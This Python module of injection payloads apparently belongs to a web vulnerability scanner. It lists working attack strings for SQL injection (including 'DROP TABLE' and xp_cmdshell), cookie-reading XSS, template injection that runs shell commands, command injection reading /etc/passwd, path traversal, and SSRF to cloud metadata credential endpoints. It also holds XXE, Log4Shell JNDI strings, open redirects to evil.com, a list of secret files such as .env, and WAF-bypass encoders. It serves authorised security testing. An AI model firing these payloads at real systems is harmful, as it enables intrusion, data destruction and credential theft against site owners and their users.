"""Payload collections for injection testing."""

from __future__ import annotations

import re
import urllib.parse

# SQL Injection

SQLI_ERROR = [
    # Classic
    "'", '"', "' OR '1'='1", "' OR 1=1--", '" OR "1"="1', "' OR ''='",
    "1' ORDER BY 1--", "1' ORDER BY 100--",
    # Union
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--", "' UNION ALL SELECT 1,2,3,4--",
    "' UNION SELECT username,password FROM users--",
    "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "1' UNION SELECT column_name,NULL FROM information_schema.columns--",
    # Auth bypass
    "admin'--", "admin' #", "admin'/*", "') OR ('1'='1",
    "') OR 1=1--", "admin' OR '1'='1'--",
    "' OR 1=1 LIMIT 1--", "' OR 1=1#", "' OR 1=1/*",
    # Stacked queries
    "'; DROP TABLE users--", "'; SELECT SLEEP(5)--",
    "'; EXEC xp_cmdshell('whoami')--",
    # Tautology (WAF bypass)
    "' OR 'a'='a", "' OR 'x'='x'--",
    "1' AND 1=1--", "1' AND 1=2--",
    # Type juggling
    "0", "1", "-1", "999999999",
    # MySQL specific
    "' OR 1=1-- -", "'-'", "'-\"", "\\x27\\x4F\\x52 SELECT",
    # PostgreSQL
    "' OR 1=1::int--", "';SELECT version()--",
    # MSSQL
    "' HAVING 1=1--", "' GROUP BY 1--",
    "' AND 1=CONVERT(int, @@version)--",
    # Oracle
    "' OR 1=1--", "' AND 1=UTL_INADDR.get_host_address('localhost')--",
]

SQLI_BLIND_TIME = [
    ("' AND SLEEP(5)--", 5),
    ("'; WAITFOR DELAY '0:0:5'--", 5),
    ("1' AND SLEEP(5) AND '1'='1", 5),
    ("' OR SLEEP(5)--", 5),
    ("' AND (SELECT SLEEP(5))--", 5),
    ("1' AND BENCHMARK(5000000,SHA1('test'))--", 5),
    ("'; SELECT PG_SLEEP(5)--", 5),
    ("' || PG_SLEEP(5)--", 5),
    ("1' AND SLEEP(5)#", 5),
    ("' WAITFOR DELAY '0:0:5'--", 5),
]

SQLI_BLIND_BOOL = [
    ("' AND 1=1--", "' AND 1=2--"),  # True/False pair
    ("' AND 'a'='a'--", "' AND 'a'='b'--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' OR 1=1--", "' OR 1=2--"),
]

SQLI_ERROR_PATTERN = re.compile(
    r"(error in your SQL syntax|you have an error in your sql"
    r"|Warning:\s*mysql_|Warning:\s*pg_|Warning:\s*mssql_|Warning:\s*oci_"
    r"|ORA-[0-9]{4,5}|SQLSTATE\[|pg_query\(\)|pg_exec\(\)"
    r"|PSQLException|SQLiteException|syntax error.*sql"
    r"|Unclosed quotation mark|quoted string not properly terminated"
    r"|Microsoft OLE DB|ADODB\.|JET Database|Syntax error \(missing operator\)"
    r"|com\.mysql\.jdbc|org\.postgresql|java\.sql\.SQLException"
    r"|System\.Data\.SqlClient|mysql_fetch|mysql_num_rows"
    r"|supplied argument is not a valid|Division by zero"
    r"|mysqli_|PDOException|ODBC SQL Server Driver"
    r"|SQL command not properly ended|invalid input syntax"
    r"|unterminated string|operator does not exist"
    r"|SQL Error|DB Error|database error|query error)",
    re.IGNORECASE,
)

# XSS

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    # Tag injection
    "'><script>alert('XSS')</script>",
    '"><script>alert(1)</script>',
    "</title><script>alert(1)</script>",
    "</textarea><script>alert(1)</script>",
    # Event handlers
    "<img src=x onerror=alert(1)>",
    "<img/src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    # Attribute breaking
    "'-alert(1)-'", '"-alert(1)-"',
    '";alert(1);//',
    "onmouseover=alert(1) ",
    "' onfocus=alert(1) autofocus='",
    '" onfocus=alert(1) autofocus="',
    # JavaScript protocol
    "javascript:alert(1)",
    "javascript:alert(document.domain)",
    "jaVaScRiPt:alert(1)",
    "java%0ascript:alert(1)",
    "java\tscript:alert(1)",
    # Data URI
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    # HTML encoding bypass
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    # Template literals
    "${alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",
    # DOM-based
    "<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>",
    "<svg><script>alert&#40;1&#41;</script>",
    # Mutation XSS
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
]

XSS_CANARY = "VAPT_XSS_"  # Unique prefix to detect reflection

# SSTI

SSTI_PAYLOADS = [
    # Jinja2 / Twig
    ("{{7*7}}", "49"),
    ("{{7*'7'}}", "7777777"),
    ("{{config}}", "SECRET_KEY"),
    ("{{self.__class__.__mro__}}", "object"),
    # Mako
    ("${7*7}", "49"),
    ("${self.module.cache.util.os.system('id')}", "uid="),
    # Freemarker
    ("#{7*7}", "49"),
    ("<#assign x=\"freemarker\">#{x}", "freemarker"),
    # ERB (Ruby)
    ("<%= 7*7 %>", "49"),
    ("<%= system('id') %>", "uid="),
    # Smarty (PHP)
    ("{php}echo 7*7;{/php}", "49"),
    ("{7*7}", "49"),
    # Expression Language (Java)
    ("${7*7}", "49"),
    ("${applicationScope}", "javax"),
    # Pebble
    ("{% set x = 7*7 %}{{x}}", "49"),
    # Velocity
    ("#set($x = 7*7)$x", "49"),
    # Handlebars
    ("{{#with \"s\" as |string|}}", "with"),
    # Thymeleaf
    ("__${7*7}__", "49"),
]

# Command Injection

CMDI_PAYLOADS: list[tuple[str, str]] = [
    # Unix
    ("; id", r"uid=\d+"),
    ("| id", r"uid=\d+"),
    ("& id", r"uid=\d+"),
    ("`id`", r"uid=\d+"),
    ("$(id)", r"uid=\d+"),
    ("; whoami", r"(root|www-data|apache|nginx|nobody|daemon)"),
    ("; cat /etc/passwd", r"root:.*:0:0:"),
    ("%0a id %0a", r"uid=\d+"),
    ("| cat /etc/passwd", r"root:.*:0:0:"),
    ("|| id", r"uid=\d+"),
    ("; uname -a", r"(Linux|Darwin|GNU)"),
    ("; ls -la /", r"(bin|etc|usr|var)"),
    # Windows
    ("; dir", r"(Volume|Directory of)"),
    ("| type C:\\Windows\\win.ini", r"\[fonts\]"),
    ("& whoami", r"\\\\"),
    ("| net user", r"(User accounts|Administrator)"),
    # Blind — timeout based
    ("; sleep 5", r""),
    ("| sleep 5", r""),
    ("& ping -c 5 127.0.0.1", r""),
    ("& timeout /t 5", r""),
    # Obfuscated
    (";{id}", r"uid=\d+"),
    ("$({id})", r"uid=\d+"),
    ("| /???/i?", r"uid=\d+"),  # Glob-based bypass
    (";\u0009id", r"uid=\d+"),  # Tab separator
]

# Path Traversal / LFI

TRAVERSAL_PAYLOADS = [
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "..%2Fetc%2Fpasswd", "..%252Fetc%252Fpasswd",
    "%2e%2e/etc/passwd", "%2e%2e%2fetc%2fpasswd",
    # Null byte (PHP < 5.3.4)
    "../etc/passwd%00", "../../etc/passwd%00.html",
    # Double encoding
    "..%c0%afetc%c0%afpasswd",
    "..%ef%bc%8fetc%ef%bc%8fpasswd",
    # Path normalization bypass
    "....//....//etc/passwd",
    "..../....//etc/passwd",
    "....\\....\\etc\\passwd",
    # Windows
    "../../../windows/system32/drivers/etc/hosts",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\windows\\win.ini",
    "/%5C../%5C../%5C../%5C../etc/passwd",
    "/..%255c..%255c..%255cetc/passwd",
    # Wrapper (PHP)
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
]

TRAVERSAL_HIT_PATTERN = re.compile(
    r"(root:.*:0:0:|daemon:.*:/|nobody:.*:/|bin:.*:/bin"
    r"|sbin:.*:/sbin|Windows IP Configuration|\[fonts\]"
    r"|; for 16-bit app support|\[extensions\])",
    re.IGNORECASE,
)

# SSRF

SSRF_URLS = [
    "http://127.0.0.1", "http://localhost",
    "http://0.0.0.0", "http://[::1]",
    "http://0177.0.0.1",  # Octal
    "http://2130706433",  # Decimal
    "http://0x7f.0x0.0x0.0x1",  # Hex
    "http://127.1", "http://127.0.0.1:22",
    # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    # Internal services
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:9200/",
    "http://127.0.0.1:27017/",
    "http://127.0.0.1:11211/",   # Memcached
    "http://127.0.0.1:5672/",    # RabbitMQ
    # Protocols
    "dict://127.0.0.1:6379/info",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
]

SSRF_PARAMS = [
    "url", "redirect", "next", "path", "uri", "src",
    "target", "dest", "destination", "file", "fetch", "load",
    "remote", "resource", "href", "proxy", "callback",
    "page", "site", "link", "img", "image", "rurl", "view",
]

SSRF_INDICATORS = re.compile(
    r"(ami-id|instance-id|computemetadata|root:x:0:0"
    r"|iam/security-credentials|latest/meta-data"
    r"|access.key|secret.key|REDIS|redis_version"
    r"|cluster_name.*elasticsearch|mongodb|couchdb"
    r"|<title>RabbitMQ)",
    re.IGNORECASE,
)

# NoSQL Injection (MongoDB, etc.)

NOSQLI_PAYLOADS = [
    # MongoDB operators
    '{"$gt": ""}', '{"$ne": ""}', '{"$regex": ".*"}',
    '{"$exists": true}', '{"$in": [""]}',
    # URL-encoded operators
    "[$gt]=", "[$ne]=", "[$regex]=.*",
    "[$exists]=true", "[$in][]=",
    # JavaScript injection
    "'; return true; var a='",
    "'; return this.password; var a='",
    '";return true;var a="',
    # Always-true conditions
    "true, $where: '1 == 1'",
    ", $where: 'function() { return true; }'",
    "1 || 1==1",
]

# LDAP Injection

LDAP_PAYLOADS = [
    "*", "*)(&", "*))%00",
    "*()|%26'", "admin)(&)", "admin)(|(password=*))",
    "admin*)((|userPassword=*)",
    "x' or name()='username' or 'x'='y",
]

# XPath Injection

XPATH_PAYLOADS = [
    "' or '1'='1", "' or ''='",
    "x' or name()='username' or 'x'='y",
    "'] | //user/*[contains(*,'",
    "') or count(parent::*[position()=1])=0 or ('",
    "1 or 1=1", "' or 1=1 or ''='",
]

# CRLF Injection / HTTP Response Splitting

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:vapt=injected",
    "%0d%0aX-Injected:vapt",
    "%0d%0a%0d%0a<script>alert('CRLF')</script>",
    "\\r\\nX-Injected: vapt",
    "%E5%98%8A%E5%98%8DSet-Cookie:vapt=injected",  # Unicode CRLF
    "\r\nX-VAPT-Header: injected",
]

# Log4Shell / JNDI

LOG4J_PAYLOADS = [
    "${jndi:ldap://127.0.0.1/a}",
    "${jndi:ldap://${hostName}/exploit}",
    "${jndi:dns://127.0.0.1/a}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://127.0.0.1/a}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://127.0.0.1/a}",
    "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//127.0.0.1/a}",
    "${jndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1/a}",
]

# Open Redirect

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com", "//evil.com", "///evil.com",
    "/\\evil.com", "/%2F%2Fevil.com",
    "https%3A%2F%2Fevil.com",
    "\thttps://evil.com", "/%0Devil.com",
    "//evil%2Ecom", "https://evil.com%2F%2F",
    "////evil.com", "https:evil.com",
    "https:\\\\evil.com", "/evil.com",
    "HtTpS://evil.com",
]

REDIRECT_PARAMS = [
    "url", "redirect", "redirect_url", "redirectUrl", "redirect_uri",
    "next", "return", "returnUrl", "return_url", "return_to",
    "goto", "dest", "destination", "target", "link",
    "continue", "forward", "rurl", "r", "out", "view",
    "callback", "path", "data", "reference", "site",
]

# XXE

XXE_PAYLOADS = [
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
        '<root><data>&xxe;</data></root>'
    ),
    # Windows
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>'
        '<root>&xxe;</root>'
    ),
    # SSRF via XXE
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>'
        '<root>&xxe;</root>'
    ),
    # Parameter entity (blind XXE)
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://127.0.0.1:9999/blind"> %xxe; ]>'
        '<root>test</root>'
    ),
    # UTF-7 encoded
    (
        '<?xml version="1.0" encoding="UTF-7"?>'
        '+ADw-!DOCTYPE foo +AFs- +ADw-!ENTITY xxe SYSTEM "file:///etc/passwd"+AD4- +AF0-+AD4-'
        '+ADw-root+AD4-+ACY-xxe;+ADw-/root+AD4-'
    ),
]

# Sensitive files / paths

SENSITIVE_PATHS = [
    # VCS
    "/.git/HEAD", "/.git/config", "/.git/COMMIT_EDITMSG",
    "/.git/logs/HEAD", "/.git/refs/heads/main",
    "/.svn/entries", "/.svn/wc.db", "/.hg/store/data",
    # Env / secrets
    "/.env", "/.env.local", "/.env.production", "/.env.staging",
    "/.env.development", "/.env.backup", "/.env.old",
    "/config.php", "/config.php.bak", "/configuration.php",
    "/wp-config.php", "/wp-config.php.bak", "/wp-config.php~",
    "/web.config", "/appsettings.json", "/appsettings.Development.json",
    "/application.properties", "/application.yml",
    "/database.yml", "/settings.py", "/local_settings.py",
    "/secrets.yml", "/credentials.json",
    # Backups
    "/backup.sql", "/backup.zip", "/backup.tar.gz",
    "/db.sql", "/dump.sql", "/database.sql",
    "/site.zip", "/www.zip", "/archive.zip",
    "/public.zip", "/source.zip", "/src.zip",
    "/error.log", "/access.log", "/debug.log",
    "/app.log", "/application.log",
    # Server config
    "/.htpasswd", "/.htaccess",
    "/server-status", "/server-info",
    "/nginx.conf", "/httpd.conf",
    # Docs / API specs
    "/robots.txt", "/sitemap.xml", "/security.txt",
    "/.well-known/security.txt",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/api/swagger.json", "/api/openapi.json",
    "/swagger-ui.html", "/swagger/v1/swagger.json",
    "/v2/api-docs", "/v3/api-docs",
    # Debug / dev
    "/phpinfo.php", "/info.php", "/test.php", "/pi.php",
    "/debug", "/console", "/_profiler", "/__debug__/",
    "/trace", "/elmah.axd", "/error_log",
    # Java / Spring
    "/actuator", "/actuator/env", "/actuator/health",
    "/actuator/beans", "/actuator/mappings",
    "/actuator/configprops", "/actuator/heapdump",
    "/h2-console", "/jolokia",
    # Docker / K8s
    "/docker-compose.yml", "/Dockerfile", "/.dockerignore",
    # Node
    "/package.json", "/package-lock.json", "/node_modules/",
    "/yarn.lock", "/.npmrc",
    # Python
    "/requirements.txt", "/Pipfile", "/pyproject.toml",
    # DS_Store / OS files
    "/.DS_Store", "/Thumbs.db", "/desktop.ini",
    "/admin/", "/administrator/", "/phpmyadmin/",
    "/adminer.php", "/wp-admin/", "/wp-login.php",
    "/manager/html", "/admin-console",
]


# WAF Bypass encoding functions

def encode_double_url(payload: str) -> str:
    """Double URL encoding: % -> %25."""
    return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")


def encode_unicode(payload: str) -> str:
    """Unicode escape encoding."""
    return "".join(f"\\u{ord(c):04x}" for c in payload)


def encode_hex(payload: str) -> str:
    """Hex encoding."""
    return "".join(f"\\x{ord(c):02x}" for c in payload)


def encode_html_entities(payload: str) -> str:
    """HTML entity encoding."""
    return "".join(f"&#{ord(c)};" for c in payload)


def case_mutate(payload: str) -> str:
    """Random case mutation for keyword bypass."""
    result = []
    for i, c in enumerate(payload):
        result.append(c.upper() if i % 2 else c.lower())
    return "".join(result)


def sql_comment_bypass(payload: str) -> str:
    """Insert SQL comments between keywords to bypass WAFs."""
    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR",
                "INSERT", "UPDATE", "DELETE", "DROP", "ORDER", "GROUP",
                "HAVING", "LIMIT", "SLEEP", "BENCHMARK"]
    result = payload
    for kw in keywords:
        result = re.sub(
            rf"\b{kw}\b",
            "/**/".join(kw),
            result,
            flags=re.IGNORECASE,
        )
    return result


def null_byte_insert(payload: str) -> str:
    """Insert null bytes to break string parsing."""
    return payload.replace(" ", "%00 ")


def generate_waf_variants(payload: str, max_variants: int = 5) -> list[str]:
    """
    Generate multiple WAF bypass variants of a payload.

    Returns up to max_variants unique encoded versions.
    """
    variants: list[str] = [payload]

    encoders = [
        encode_double_url,
        case_mutate,
        sql_comment_bypass,
        null_byte_insert,
        encode_html_entities,
    ]

    for encoder in encoders:
        try:
            v = encoder(payload)
            if v != payload and v not in variants:
                variants.append(v)
                if len(variants) >= max_variants:
                    break
        except Exception:
            pass

    return variants[:max_variants]


# Payload manager

class PayloadManager:
    """Unified access to all payload categories with optional WAF bypass."""

    def __init__(self, waf_bypass: bool = False, max_waf_variants: int = 3) -> None:
        self.waf_bypass = waf_bypass
        self.max_waf_variants = max_waf_variants

    def _expand(self, payloads: list[str]) -> list[str]:
        """If WAF bypass is enabled, expand each payload with bypass variants."""
        if not self.waf_bypass:
            return payloads
        expanded: list[str] = []
        for p in payloads:
            expanded.extend(generate_waf_variants(p, self.max_waf_variants))
        return expanded

    def get_sqli(self) -> list[str]:
        return self._expand(SQLI_ERROR)

    def get_sqli_blind(self) -> list[tuple[str, int]]:
        if self.waf_bypass:
            result = []
            for payload, delay in SQLI_BLIND_TIME:
                for v in generate_waf_variants(payload, self.max_waf_variants):
                    result.append((v, delay))
            return result
        return SQLI_BLIND_TIME

    def get_xss(self) -> list[str]:
        return self._expand(XSS_PAYLOADS)

    def get_ssti(self) -> list[tuple[str, str]]:
        return SSTI_PAYLOADS  # SSTI payloads don't benefit much from encoding

    def get_cmdi(self) -> list[tuple[str, str]]:
        return CMDI_PAYLOADS

    def get_traversal(self) -> list[str]:
        return self._expand(TRAVERSAL_PAYLOADS)

    def get_ssrf(self) -> list[str]:
        return SSRF_URLS

    def get_nosqli(self) -> list[str]:
        return self._expand(NOSQLI_PAYLOADS)

    def get_xxe(self) -> list[str]:
        return [p for p in XXE_PAYLOADS]

    def get_redirect(self) -> list[str]:
        return self._expand(OPEN_REDIRECT_PAYLOADS)

    def get_crlf(self) -> list[str]:
        return CRLF_PAYLOADS

    def get_log4j(self) -> list[str]:
        return self._expand(LOG4J_PAYLOADS)

    def get_ldap(self) -> list[str]:
        return self._expand(LDAP_PAYLOADS)

    def get_xpath(self) -> list[str]:
        return self._expand(XPATH_PAYLOADS)

    def get_sensitive_paths(self) -> list[str]:
        return SENSITIVE_PATHS

    def total_payload_count(self) -> int:
        """Count total payloads available (for display purposes)."""
        total = (
            len(SQLI_ERROR) + len(SQLI_BLIND_TIME) + len(SQLI_BLIND_BOOL)
            + len(XSS_PAYLOADS) + len(SSTI_PAYLOADS) + len(CMDI_PAYLOADS)
            + len(TRAVERSAL_PAYLOADS) + len(SSRF_URLS) + len(NOSQLI_PAYLOADS)
            + len(LDAP_PAYLOADS) + len(XPATH_PAYLOADS) + len(CRLF_PAYLOADS)
            + len(LOG4J_PAYLOADS) + len(OPEN_REDIRECT_PAYLOADS)
            + len(XXE_PAYLOADS) + len(SENSITIVE_PATHS)
        )
        if self.waf_bypass:
            total *= self.max_waf_variants
        return total
